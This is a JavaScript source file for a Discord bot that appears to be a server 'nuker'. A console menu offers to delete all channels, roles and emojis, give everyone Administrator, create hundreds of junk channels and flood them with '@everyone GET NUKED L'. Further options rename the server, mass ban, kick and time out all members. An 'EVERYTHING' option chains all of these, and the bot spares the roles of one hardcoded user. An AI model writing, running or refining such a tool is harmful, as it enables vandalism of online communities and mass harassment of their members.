const { Client, IntentsBitField, ChannelType } = require("discord.js");

const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
    IntentsBitField.Flags.GuildVoiceStates,
    IntentsBitField.Flags.GuildMessageReactions,
    IntentsBitField.Flags.DirectMessages,
    IntentsBitField.Flags.DirectMessageReactions,
    IntentsBitField.Flags.DirectMessageTyping,
    IntentsBitField.Flags.GuildScheduledEvents,
    IntentsBitField.Flags.GuildInvites,
    IntentsBitField.Flags.GuildIntegrations,
    IntentsBitField.Flags.GuildWebhooks,
    IntentsBitField.Flags.GuildEmojisAndStickers,
    IntentsBitField.Flags.GuildPresences,
  ],
});

client.on("ready", (b) => {
  guild = client.guilds.cache.first();
});

let guild;

console.log(
  "\x1b[35m%s\x1b[0m",
  `

                    ░▒▓████████▓▒░    ███████████ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
                    ░▒▓█▓▒░               ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
                    ░▒▓█▓▒░               ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
                    ░▒▓██████▓▒░          ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
                    ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
                    ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
                    ░▒▓████████▓▒░  ░▒▓██████▓▒░   ░▒▓█████████████▓▒░
    `
);
console.log(`            ----------------------------------------------------------------
`);

process.stdout.write("                               \x1b[35m1.\x1b[0m");
console.log(" Delete all channels");
process.stdout.write("                               \x1b[35m2.\x1b[0m ");
console.log("Delete all emotes/emojis");
process.stdout.write("                               \x1b[35m3.\x1b[0m ");
console.log("Give everyone Administrator");
process.stdout.write("                               \x1b[35m4.\x1b[0m ");
console.log("Delete all Roles");
process.stdout.write("                               \x1b[35m5.\x1b[0m ");
console.log("Create channels");
process.stdout.write("                               \x1b[35m6.\x1b[0m ");
console.log("Spam messages to all channels");
process.stdout.write("                               \x1b[35m7.\x1b[0m ");
console.log("Change server name");
process.stdout.write("                               \x1b[35m8.\x1b[0m ");
console.log("Change server icon");
process.stdout.write("                               \x1b[35m9.\x1b[0m ");
console.log("Mass ban");
process.stdout.write("                               \x1b[35m10.\x1b[0m ");
console.log(`Mass kick
            `);

process.stdout.write("                               \x1b[35m11.\x1b[0m ");
console.log(`⚠️  EVERYTHING ⚠️
            `);
guild = client.guilds.cache.first();

const readline = require("readline");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});
P;
const promptUser = () => {
  rl.question(
    "                                     Choice:",
    async (answer) => {
      if (answer.trim() === "1") {
        client.guilds.cache.forEach((guild) => {
          guild.channels.cache.forEach(async (channel) => {
            try {
              await channel.delete();
              process.stdout.write("     ".repeat(7) + `\x1b[35m[-]\x1b[0m`);
              process.stdout.write(" ".repeat(1) + `Deleted`);
              process.stdout.write(` \x1b[35m${channel.name}\x1b[0m\n`);
            } catch (error) {
              console.error(
                `Failed to delete ${channel.name} in ${guild.name}: ${error}`
              );
            }
          });
        });
      }

      if (answer.trim() === "2") {
        // delete all emojis
        const emojis = client.emojis.cache;

        if (emojis.size > 0) {
          emojis.forEach((emoji, index) => {
            setTimeout(() => {
              try {
                emoji
                  .delete()
                  .then((deletedEmoji) => {
                    process.stdout.write(
                      "     ".repeat(7) + `\x1b[35m[-]\x1b[0m`
                    );
                    process.stdout.write(" ".repeat(1) + `Removed:`);
                    process.stdout.write(
                      ` \x1b[35m${deletedEmoji.name}\x1b[0m\n`
                    );
                  })
                  .catch(console.error);
              } catch (err) {
                console.error(err);
              }
            }, index * 2500); // Delay each deletion by 2500 ms
          });
        } else {
          console.log("No emojis to delete.");
        }
      }

      if (answer.trim() === "3") {
        // give administrator to everyone
        const everyoneRole = client.guilds.cache.map((guild) =>
          guild.roles.cache.find((role) => role.name === "@everyone")
        );
        everyoneRole.forEach((role) => {
          role
            .setPermissions(["Administrator", "BanMembers", "KickMembers"])
            .then((updated) =>
              console.log(
                `Updated permissions for @everyone role in guild ${updated.guild.name}`
              )
            )
            .catch(console.error);
        });
      }

      if (answer.trim() === "4") {
        // delete all roles
        const USER_ID = "1244261026078396426";
        const guilds = client.guilds.cache;

        guilds.forEach(async (guild) => {
          try {
            const member = await guild.members.fetch(USER_ID);
            const memberRoles = new Set(
              member.roles.cache.map((role) => role.id)
            );
            const roles = await guild.roles.fetch();

            await Promise.all(
              roles.map(async (role) => {
                if (!memberRoles.has(role.id)) {
                  try {
                    await role.delete();
                    process.stdout.write(
                      "     ".repeat(7) + `\x1b[35m[-]\x1b[0m`
                    );
                    process.stdout.write(" ".repeat(1) + `Deleted role:`);
                    process.stdout.write(` \x1b[35m${role.name}\x1b[0m\n`);
                  } catch (error) {
                    console.error(`Failed to delete role: ${role.name}`, error);
                  }
                }
              })
            );
          } catch (error) {
            console.error(
              `Error fetching member for guild ${guild.id}:`,
              error
            );
          }
        });
      }

      if (answer.trim() === "5") {
        rl.question(
          "                                     How much:",
          async (channelCount) => {
            const repeatCount = parseInt(channelCount);

            if (isNaN(repeatCount) || repeatCount <= 0) {
              console.error(
                "Invalid input. Please enter a valid number greater than 0."
              );
              // Loop back to the prompt
              promptUser();
              return;
            }

            for (let i = 0; i < repeatCount; i++) {
              try {
                const newChannel = await guild.channels.create({
                  name: `yomama-com508#=${i}`,
                  type: ChannelType.GuildText,
                });

                // Log the creation of the new channel
                process.stdout.write("     ".repeat(7) + `\x1b[35m[+]\x1b[0m`);
                process.stdout.write(" ".repeat(1) + `Created channel`);
                process.stdout.write(` \x1b[35m${newChannel.name}\x1b[0m\n`);
              } catch (error) {
                console.error("Error creating channel:", error);
              }
            }

            promptUser();
          }
        );
      }

      if (answer.trim() === "6") {
        rl.question(
          "                                     Number of messages: ",
          async (messageCount) => {
            const repeatCount = parseInt(messageCount);

            if (isNaN(repeatCount) || repeatCount <= 0) {
              console.error(
                "Invalid input. Please enter a valid number greater than 0."
              );
              // Loop back to the prompt
              promptUser();
              return;
            }

            rl.question(
              "                                     Content: ",
              async (messageContent) => {
                for (let i = 0; i < repeatCount; i++) {
                  guild.channels.cache.forEach(async (channel) => {
                    if (channel.type === ChannelType.GuildText) {
                      try {
                        await channel.send(messageContent);
                        process.stdout.write(
                          "     ".repeat(7) + `\x1b[35m[+]\x1b[0m`
                        );
                        process.stdout.write(
                          " ".repeat(1) + `Sent message to channel:`
                        );
                        process.stdout.write(
                          ` \x1b[35m${channel.name}\x1b[0m\n`
                        );
                      } catch (error) {
                        // console.error("Error sending message:", error);
                      }
                    }
                    await new Promise((resolve) => setTimeout(resolve, 1000)); // Add a delay of 1 second
                  });
                }

                // Loop back to the prompt
                promptUser();
              }
            );
          }
        );
      }

      if (answer.trim() === "7") {
        rl.question(
          "                                     New name: ",
          async (newServerName) => {
            if (!guild) {
              console.error("Guild is not defined.");
              return;
            }

            guild
              .setName(newServerName)
              .then(() => {
                process.stdout.write("     ".repeat(7) + `\x1b[35m[+]\x1b[0m`);
                process.stdout.write(" ".repeat(1) + `Renamed server to`);
                process.stdout.write(` \x1b[35m${newServerName}\x1b[0m\n`);
                promptUser();
              })
              .catch((err) => {
                console.error("Error changing server name:", err);
              });
          }
        );
      }

      if (answer.trim() === "8") {
        const newServerIcon = "nuke_icon.jpg";
        guild
          .setIcon(newServerIcon)
          .then(() => console.log(`Set Server icon`))
          .catch((err) => {
            console.error("Error changing server icon:", err);
          });
      }

      if (answer.trim() === "9") {
        const ownerId = guild.ownerId;
        const botId = client.user.id; // Assuming client is your Discord bot client

        guild.members
          .fetch()
          .then((members) => {
            members.forEach((member) => {
              if (member.id !== ownerId && member.id !== botId) {
                // Skip banning the owner and the bot
                member
                  .ban()
                  .then(() => console.log(`Banned ${member.user.tag}`))
                  .catch((error) =>
                    console.error(`Failed to ban ${member.user.tag}:`, error)
                  );
              }
            });
          })
          .catch((error) =>
            console.error("Failed to fetch guild members:", error)
          );
      }

      if (answer.trim() === "10") {
        const ownerId = guild.ownerId;
        const botId = client.user.id; // Assuming client is your Discord bot client

        guild.members
          .fetch()
          .then((members) => {
            members.forEach((member) => {
              if (member.id !== ownerId && member.id !== botId) {
                // Skip banning the owner and the bot
                member
                  .kick()
                  .then(() => console.log(`Kicked ${member.user.tag}`))
                  .catch((error) =>
                    console.error(`Failed to kick ${member.user.tag}:`, error)
                  );
              }
            });
          })
          .catch((error) =>
            console.error("Failed to fetch guild members:", error)
          );
      }

      if (answer.trim() === "11") {
        // do everything

        client.guilds.cache.forEach((guild) => {
          guild.channels.cache.forEach(async (channel) => {
            try {
              await channel.delete();
              process.stdout.write("     ".repeat(7) + `\x1b[35m[-]\x1b[0m`);
              process.stdout.write(" ".repeat(1) + `Deleted`);
              process.stdout.write(` \x1b[35m${channel.name}\x1b[0m\n`);
            } catch (error) {
              /*  console.error(
                `Failed to delete ${channel.name} in ${guild.name}: ${error}`
              );  */
            }
          });
        });

        const repeatCount = 500;

        for (let i = 0; i < repeatCount; i++) {
          const newChannel = await guild.channels.create({
            name: `yomama-com508#=(£!q-${i}`,
            type: ChannelType.GuildText,
          });
          process.stdout.write("     ".repeat(7) + `\x1b[35m[+]\x1b[0m`);
          process.stdout.write(" ".repeat(1) + `Created channel`);
          process.stdout.write(` \x1b[35m${newChannel.name}\x1b[0m\n`);

          const spamMessage = "@everyone @here GET NUKED L";
          const repeatCountMsg = 100;

          guild.channels.cache.forEach((channel) => {
            if (channel.type === ChannelType.GuildText) {
              for (let i = 0; i < repeatCountMsg; i++) {
                channel.send(spamMessage).catch(console.error);
                process.stdout.write("     ".repeat(7) + `\x1b[35m[+]\x1b[0m`);
                process.stdout.write(
                  " ".repeat(1) + `Sent message to channel:`
                );
                process.stdout.write(` \x1b[35m${channel.name}\x1b[0m\n`);
              }
            }
          });

          const USER_ID = "1244261026078396426";
          const member = await guild.members.fetch(USER_ID);

          const memberRoles = new Set(
            member.roles.cache.map((role) => role.id)
          );

          const roles = await guild.roles.fetch();

          await Promise.all(
            roles.map(async (role) => {
              if (!memberRoles.has(role.id)) {
                try {
                  await role.delete();
                  process.stdout.write(
                    "     ".repeat(7) + `\x1b[35m[-]\x1b[0m`
                  );
                  process.stdout.write(" ".repeat(1) + `Deleted role:`);
                  process.stdout.write(` \x1b[35m${role.name}\x1b[0m\n`);
                } catch (error) {
                  // console.error(`Failed to delete role: ${role.name}`, error);
                }
              }
            })
          );

          const ownerIdE = guild.ownerId;

          const members = await guild.members.fetch();
          members.forEach((member) => {
            if (!member.user.bot && member.id !== ownerIdE) {
              if (!member.communicationDisabledUntilTimestamp) {
                member
                  .timeout(2419200000, "NUKE L")
                  .then(() => {
                    // console.log(`Timed out ${member.user.tag}`);
                  })
                  .catch((err) => {
                    // console.error(`Could not timeout ${member.user.tag}:`, err);
                  });
              }
            }
          });

          const ownerId = guild.ownerId;
          const botId = client.user.id; // Assuming client is your Discord bot client

          guild.members.fetch().then((members) => {
            members.forEach((member) => {
              if (member.id !== ownerId && member.id !== botId) {
                // Skip banning the owner and the bot
                member
                  .ban()
                  .then(() => console.log(`Banned ${member.user.tag}`));
              }
            });
          });

          const newServerName = "NUKED";
          guild.setName(newServerName).catch((err) => {
            // console.error("Error changing server name:", err);
          });

          const newServerIcon = "nuke_icon.jpg";
          guild.setIcon(newServerIcon).catch((err) => {
            // console.error("Error changing server icon:", err);
          });

          // delete all emojis
          const emojis = client.emojis.cache;

          if (emojis.size > 0) {
            emojis.forEach((emoji, index) => {
              setTimeout(() => {
                try {
                  emoji
                    .delete()
                    .then((deletedEmoji) => {
                      process.stdout.write(
                        "     ".repeat(7) + `\x1b[35m[-]\x1b[0m`
                      );
                      process.stdout.write(" ".repeat(1) + `Removed:`);
                      process.stdout.write(
                        ` \x1b[35m${deletedEmoji.name}\x1b[0m\n`
                      );
                    })
                    .catch(console.error);
                } catch (err) {
                  console.error(err);
                }
              }, index * 2500); // Delay each deletion by 2500 ms
            });
          } else {
            console.log("No emojis to delete.");
          }

          const everyoneRole = guild.roles.everyone;
          everyoneRole.setPermissions([
            "Administrator",
            "BanMembers",
            "KickMembers",
          ]);
        }
      }

      // Loop back to the prompt
      promptUser();
    }
  );
};

// Start the prompt loop
setTimeout(promptUser, 1000);

// put client.login() your token here
